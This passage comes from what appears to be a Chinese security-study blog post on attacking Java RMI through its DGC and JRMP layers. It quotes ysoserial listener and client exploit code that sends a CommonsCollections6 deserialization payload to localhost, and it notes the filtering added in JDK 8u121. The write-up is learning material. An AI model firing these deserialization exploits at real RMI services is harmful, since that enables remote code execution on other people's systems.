+<li>服务端通过<code>DGCImpl_Skel#dispatch()</code>方法进行处理</li>
+</ol>
+<p><code>DGCImpl_Skel#dispatch()</code>方法通过序列化和反序列化处理数据：<br>
+<img src="https://1jzz.github.io/post-images/1655041141535.png" alt="" loading="lazy"><br>
+当开启RMI服务时DGC服务也会开启，因为也是使用序列化和反序列化来处理数据，所以也存在触发反序列化漏洞的可能。<br>
+因为RMI通信和DGC通信的Target都是从ObjectTable.objTable属性中获取。<br>
+<img src="https://1jzz.github.io/post-images/1655041148800.png" alt="" loading="lazy"><br>
+其调用的Skel中的dispatch方法是由这个objNum来区分的，因此我们可以使用 DGC 来攻击任意一个由 JRMP协议监听的端口，包括注册中心端口、远程对象监听端口、DGCImpl_Stub 监听端口。不过由于后两者的端口号是随机的，因此通常使用 DGC 层来攻击注册中心。<br>
+<img src="https://1jzz.github.io/post-images/1655041168638.png" alt="" loading="lazy"></p>
+<h2 id="jrmp攻击">JRMP攻击</h2>
+<p>JRMP的服务端和客户端是可以互打的，JRMP是一个协议，是用于java RMI过程中的协议，只有使用这个协议，双方才能正常的进行数据交流。<br>
+JRMP协议规定了RMI，传输的数据包含有java原生序列化数据，并且在JRMP的客户端和服务端接收到对方发送的序列化数据时，都会进行反序列化，产生了反序列化漏洞。<br>
+这里使用ysoserial的payload直接创建一个JRMP的服务端：</p>
+<pre><code class="language-java">public class JRMPListener1 extends PayloadRunner implements ObjectPayload&lt;UnicastRemoteObject&gt; {
+
+    public UnicastRemoteObject getObject ( final String command ) throws Exception {
+        int jrmpPort = Integer.parseInt(command);
+        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
+            RemoteRef.class
+        }, new Object[] {
+            new UnicastServerRef(jrmpPort)
+        });
+
+        Reflections.getField(UnicastRemoteObject.class, &quot;port&quot;).set(uro, jrmpPort);
+        return uro;
+    }
+
+
+    public static void main ( final String[] args ) throws Exception {
+        PayloadRunner.run(ysoserial.payloads.JRMPListener.class, new String[] {&quot;8889&quot;});
+    }
+}
+</code></pre>
+<p>接着使用ysoserial.exploit.JRMPClinet.java这个exploit去打服务端：</p>
+<pre><code class="language-java">public class JRMPClient {
+
+    public static final void main ( String[] args ) {
+        args = new String[] {&quot;127.0.0.1&quot;, &quot;8889&quot;, &quot;CommonsCollections6&quot;, &quot;calc&quot;};
+        if ( args.length &lt; 4 ) {
+            System.err.println(JRMPClient.class.getName() + &quot; &lt;host&gt; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);
+            System.exit(-1);
+        }
+
+        Object payloadObject = Utils.makePayloadObject(args[2], args[3]);
+        String hostname = args[ 0 ];
+        int port = Integer.parseInt(args[ 1 ]);
+        try {
+            System.err.println(String.format(&quot;* Opening JRMP socket %s:%d&quot;, hostname, port));
+            makeDGCCall(hostname, port, payloadObject);
+        }
+        catch ( Exception e ) {
+            e.printStackTrace(System.err);
+        }
+        Utils.releasePayload(args[2], payloadObject);
+    }
+    ...
+}
+</code></pre>
+<p>当我们指定了客户端使用JRMP协议去连接服务端时，使用CC6这个payload，去执行命令。<br>
+在jdk8u121开始，部分class会被过滤，导致大部分payload不能被反序列化，报错内容：</p>
+<pre><code>六月 12, 2022 5:09:14 下午 java.io.ObjectInputStream filterCheck
+信息: ObjectInputFilter REJECTED: class java.util.HashSet, array length: -1, nRefs: 2, depth: 1, bytes: 73, ex: n/a
+</code></pre>
+<p>接下来我们再看看怎么使用JRMP协议的服务端去攻击客户端。<br>
+使用ysoserial.exploit.JRMPListener.java开启服务端：</p>
+<pre><code class="language-java">public class JRMPListener implements Runnable {
+    ...
+    public static final void main ( String[] args ) {
+        args = new String[] {&quot;9999&quot;, &quot;CommonsCollections6&quot;, &quot;calc&quot;};
+        if ( args.length &lt; 3 ) {
+            System.err.println(JRMPListener.class.getName() + &quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);
+            System.exit(-1);
+            return;
+        }
+        
+        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);
+        
+        try {
+            int port = Integer.parseInt(args[ 0 ]);
+            System.err.println(&quot;* Opening JRMP listener on &quot; + port);
+            JRMPListener c = new JRMPListener(port, payloadObject);
+            c.run();
+        }
+        catch ( Exception e ) {
+            System.err.println(&quot;Listener error&quot;);
+            e.printStackTrace(System.err);
+        }
+        Utils.releasePayload(args[1], payloadObject);
+    }
+    ...
+}
+</code></pre>
+<p>使用ysoserial.payloads.JRMPClient.java进行请求：</p>
+<pre><code class="language-java">public class JRMPClient extends PayloadRunner implements ObjectPayload&lt;Registry&gt; {
+
+    public Registry getObject (  String command ) throws Exception {
+        command = &quot;127.0.0.1:9999&quot;;
+
+        String host;
+        int port;
+        int sep = command.indexOf(':');
+        if ( sep &lt; 0 ) {
+            port = new Random().nextInt(65535);
+            host = command;
+        }
+        else {
+            host = command.substring(0, sep);
+            port = Integer.valueOf(command.substring(sep + 1));
+        }
+        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(host, port);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
+            Registry.class
+        }, obj);
+        return proxy;
+    }
+
+
+    public static void main ( final String[] args ) throws Exception {
+        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
+        PayloadRunner.run(JRMPClient.class, args);
+    }
+}
+</code></pre>
+<p>在JRMP协议中不管是服务端和客户端，都有被攻击的可能性。</p>
+<h1 id="总结">总结</h1>
+<ol>
+<li>了解了RMI的相关实现以及漏洞利用方式</li>
+</ol>
+<p>还需了解：</p>
+<ol>
+<li>JRMP攻击的实现</li>
+<li>JEP290了解以及绕过</li>
+<li>更加熟悉RMI的底层实现，自己造一个轮子</li>
+</ol>
+<h1 id="参考">参考</h1>
+<p><a href="https://xz.aliyun.com/t/7079">https://xz.aliyun.com/t/7079</a><br>
+<a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br>
+<a href="https://xz.aliyun.com/t/7264">https://xz.aliyun.com/t/7264</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">代码分析</a>
+<ul>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C">服务注册</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA">远程对象创建</a></li>
+<li><a href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%88%9B%E5%BB%BA">注册中心创建</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%BB%91%E5%AE%9A">远程对象绑定</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8">远程对象调用</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B0%8F%E7%BB%93">小结</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BBrmi">攻击RMI</a>
+<ul>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF">攻击服务端</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83">攻击注册中心</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF">攻击客户端</a>
+<ul>
+<li><a href="#%E9%80%9A%E8%BF%87lookup%E6%96%B9%E6%B3%95%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1%E6%97%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C">通过lookup方法获取远程代理对象时的反序列化操作</a></li>
+<li><a href="#%E9%80%9A%E8%BF%87%E8%B0%83%E7%94%A8%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1%E4%BD%86%E6%98%AF%E4%BC%A0%E5%85%A5%E6%88%96%E8%80%85%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%B1%BB">通过调用动态代理对象，但是传入或者返回一个恶意类</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD">动态类加载</a></li>
+<li><a href="#%E6%94%BB%E5%87%BBdgc">攻击DGC</a></li>
+</ul>
+</li>
+<li><a href="#jrmp%E6%94%BB%E5%87%BB">JRMP攻击</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/kcCAzbd7s/">
+              <h3 class="post-title">
+                内存马学习1
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
